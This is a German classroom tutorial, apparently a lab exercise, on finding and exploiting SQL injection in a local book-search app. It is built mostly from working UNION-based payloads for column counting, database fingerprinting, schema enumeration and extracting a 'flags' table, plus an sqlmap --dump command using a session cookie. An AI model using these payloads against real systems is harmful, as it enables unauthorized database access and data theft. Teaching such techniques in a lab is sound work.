# SQL Injection – Black-Box Guide (Schritt für Schritt)

> **Nur lokal auf `http://localhost:3000` im Unterricht verwenden.** Nie gegen fremde Systeme.

Ziel: Eine SQL Injection im Suchfeld `/books/search?q=` finden und ausnutzen –
**ohne den Quellcode zu kennen**. Man entdeckt die Query, indem man sie Schritt
für Schritt "vermisst".

---

## Schritt 1 – Ist das Feld überhaupt injizierbar?

Ein einzelnes Anführungszeichen senden und auf Fehler / kaputte Seite achten:

```
q = '
```

Danach ein Paar Anführungszeichen – das sollte wieder **normal** funktionieren:

```
q = ''
```

Fehler bei einem `'`, normal bei zwei `''` = klassisches Zeichen für Injizierbarkeit.

---

## Schritt 2 – Bin ich in einem String? Kann ich kommentieren?

Boolean testen, der nur funktioniert, wenn man aus dem `'...'` ausgebrochen ist:

```
q = ' OR '1'='1
q = %' OR '1'='1
```

Kommen plötzlich **alle** Zeilen zurück, ist der String-Literal aufgebrochen.

Kommentar-Stile testen, um den Rest der Query abzuschneiden:

```
q = '--            (Leerzeichen nach -- bei SQLite/MySQL)
q = '#
q = '/*
```

Welcher die Fehler stoppt, verrät DB-Typ und dass man die Query beenden kann.

---

## Schritt 3 – Wie viele Spalten? (für UNION nötig)

Die Spaltenzahl des originalen SELECT muss übereinstimmen.

**Variante A – ORDER BY** hochzählen bis Fehler:

```
q = ' ORDER BY 1 --
q = ' ORDER BY 2 --
...
q = ' ORDER BY 6 --      ← Fehler hier = es gibt 5 Spalten
```

**Variante B – UNION mit NULLs**, bis die Seite rendert statt zu erroren:

```
q = ' UNION SELECT NULL --
q = ' UNION SELECT NULL,NULL --
q = ' UNION SELECT NULL,NULL,NULL,NULL,NULL --   ← funktioniert = 5 Spalten
```

`NULL` passt in jeden Datentyp → keine Typ-Fehler beim Probieren.

---

## Schritt 4 – Welche Spalten sind auf der Seite sichtbar?

Marker in jeden Slot setzen, um zu sehen, welche ausgegeben werden:

```
q = ' UNION SELECT 'a','b','c','d','e' --
```

Die sichtbaren Buchstaben sind deine "Ausgabe-Kanäle".

---

## Schritt 5 – Datenbank fingerprinten

Verschiedene DBs geben ihre Version unterschiedlich preis:

```
q = ' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL --   (SQLite)
q = ' UNION SELECT version(),NULL,NULL,NULL,NULL --          (MySQL/Postgres)
q = ' UNION SELECT @@version,NULL,NULL,NULL,NULL --          (MySQL/MSSQL)
```

Welche nicht erroret, identifiziert die Engine.

---

## Schritt 6 – Tabellen & Spalten aufzählen (Schema)

Den DB-eigenen Katalog auslesen.

**SQLite:**

```
q = ' UNION SELECT name,sql,NULL,NULL,NULL FROM sqlite_master WHERE type='table' --
```

`sql` liefert das komplette `CREATE TABLE` inkl. aller Spaltennamen.

**MySQL / Postgres (information_schema):**

```
q = ' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables --
q = ' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='flags' --
```

---

## Schritt 7 – Daten extrahieren

Bekannte Tabelle/Spalten in die sichtbaren Slots laden:

```
q = ' UNION SELECT name,value,NULL,NULL,NULL FROM flags --
```

---

## Kernidee

Man braucht den Quellcode nie. Jeder Schritt **misst** die Query:

- `'` → Injizierbarkeit
- `ORDER BY` / `UNION NULL` → Spaltenzahl
- Marker (`'a','b',...`) → sichtbare Spalten
- `information_schema` / `sqlite_master` → Schema

Genau so arbeitet auch **sqlmap** automatisch:

```bash
sqlmap -u "http://localhost:3000/books/search?q=test" --cookie="connect.sid=..." --dump
```

(Session-Cookie aus dem eingeloggten Browser holen, da `/books` einen Login verlangt.)

---

## Nachweis / Proof-of-Concept (Kurzform)

| Beweis | Eingabe in `q` | Erwartung |
|---|---|---|
| Injizierbar | `'` | SQL-Fehlermeldung |
| Logik manipulierbar | `%' OR '1'='1` | alle Bücher werden angezeigt |
| Fremde Tabelle lesbar | `%' UNION SELECT id, name, value, NULL, NULL FROM flags -- ` | Flags erscheinen als "Bücher" |
